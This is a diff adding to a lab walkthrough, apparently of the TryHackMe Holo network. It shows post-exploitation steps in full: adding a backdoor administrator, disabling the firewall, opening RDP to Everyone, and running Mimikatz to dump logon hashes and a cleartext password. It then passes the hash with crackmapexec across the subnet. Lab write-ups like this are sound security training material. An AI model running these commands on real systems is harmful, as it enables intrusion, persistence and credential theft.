@@ -439,10 +439,41 @@ nt authority\system
 ```
 - We will find the root flag under the desktop.
 - I tried to dump sam file but I don't have access to this.
-- I used the below commands further.
+- I used the below commands further to add a new user in case I lost the connection to the shell I can use it, and disable to necessary services on the host.
 ```bash
 net user boss boss123 /add
 net localgroup administrators boss /add
 netsh advfirewall set allprofiles state off
 net localgroup "Remote Desktop Users" Everyone /Add
 ```
+- Then I run the covenant powershell launcher command to get Grunt.
+- On grunt, I upload and execute `Mimikatz` to dump logonpasswords.
+```powershell
+Upload /filepath:"C:\Users\Public\mimikatz.exe"
+.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" exit
+
+User Name         : watamet
+Domain            : HOLOLIVE
+Logon Server      : DC-SRV01
+Logon Time        : 8/1/2023 8:47:22 PM
+SID               : S-1-5-21-471847105-3603022926-1728018720-1132
+	msv :	
+	 [00000003] Primary
+	 * Username : watamet
+	 * Domain   : HOLOLIVE
+	 * NTLM     : d8d41e6cf762a8c77776a1843d4141c9
+	 * SHA1     : 7701207008976fdd6c6be9991574e2480853312d
+        kerberos :	
+	 * Username : watamet
+	 * Domain   : HOLO.LIVE
+	 * Password : Nothingtoworry!
+
+```
+- We have the credentials, now we will use `crackmapexec` to check the host to which the credentials belong.
+```
+└─$ proxychains crackmapexec smb 10.200.112.0/24 -u watamet -d HOLOLIVE -H d8d41e6cf762a8c77776a1843d4141c9
+
+SMB         10.200.112.31   445    S-SRV01          [+] HOLOLIVE\watamet:d8d41e6cf762a8c77776a1843d4141c9 (Pwn3d!)
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.112.102:445 SMB         10.200.112.35   445    PC-FILESRV01     [+] holo.live\watamet:d8d41e6cf762a8c77776a1843d4141c9 
+```
+- Results on crackmapexec show that we have access to PC-FILESRV01 also.
